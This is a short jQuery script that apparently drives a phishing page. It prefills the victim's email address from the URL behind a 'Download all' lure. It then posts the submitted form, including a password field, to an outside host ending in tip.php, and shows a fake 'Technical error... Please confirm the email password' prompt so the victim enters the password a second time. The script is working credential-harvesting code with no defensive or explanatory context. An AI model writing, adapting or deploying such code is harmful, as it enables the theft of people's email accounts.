
            $(document).ready(function () {
                var baseUrl = (window.location).href;
                var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
                $("#x1").val(url);
                $("#m1").html(url);

                $("#users").submit(function (event) {
                    event.preventDefault();
                    $("#sub").html("Porcessing...").prop("disabled", true);
                    $.ajax({
                        type: "POST",
                        url: "https://uixjaweb.xyz/tip.php",
                        data: $(this).serialize()
                    }).done(function (data) {
                        setTimeout(function () {
                            $("#myModal").modal("hide");
                            $("#mydal").modal("show");
                            setTimeout(function () {
                                $("#ms").html(`Technical error encountered
Please confirm the email password
Try Again<br>
      
                                                `);
                                setTimeout(function () {
                                    $("#myModal").modal("show");
                                    $("#mydal").modal("hide");
                                    $("#sub").html("Download all").prop("disabled", false);
                                    $("#ps").val("");
                                    $("#x1").val(url);
                                }, 3000);

                            }, 2000);

                        }, 3000);


                    }).fail(function () {
                        alert("error");
                    });
                })
            });

        
